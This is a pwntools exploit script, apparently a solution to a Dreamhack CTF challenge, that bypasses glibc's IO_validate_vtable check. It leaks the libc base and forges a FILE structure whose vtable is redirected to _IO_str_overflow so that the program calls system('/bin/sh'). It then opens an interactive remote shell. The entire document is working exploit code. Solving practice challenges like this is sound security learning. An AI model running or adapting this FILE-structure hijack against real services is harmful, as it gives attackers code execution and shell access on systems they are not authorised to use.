from pwn import *

port = 19809
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/Bypass IO_validate_vtable/problem/bypass_valid_vtable")
lib = ELF("./Pwnable/Bypass IO_validate_vtable/problem/libc.so.6")

rem.recvuntil(b"stdout: ")
stdout_addr = int(rem.recvn(14).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
ioFileJumps_addr = lib_base + lib.symbols['_IO_file_jumps']
ioStrOverflow_addr = ioFileJumps_addr + 0xd8
fakeVtable_addr = ioStrOverflow_addr - 16
system_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + next(lib.search(b'/bin/sh'))
fp = elf.symbols['fp']

payload = p64(0x0)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64((binsh_addr - 100) // 2) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((binsh_addr - 100) // 2) # _IO_buf_end
payload += p64(0) # _IO_save_base
payload += p64(0) # _IO_basckup_base
payload += p64(0) # _IO_save_end
payload += p64(0) # _markers
payload += p64(0) # _chain
payload += p64(0) # _fileno
payload += p64(0) # _old_offset
payload += p64(0) 
payload += p64(fp + 0x80) # _lock
payload += p64(0x0) * 9
payload += p64(fakeVtable_addr) # io_file_jump overwrite
payload += p64(system_addr) # fp->_s._allocate_buffer RIP

rem.sendline(payload)

rem.interactive()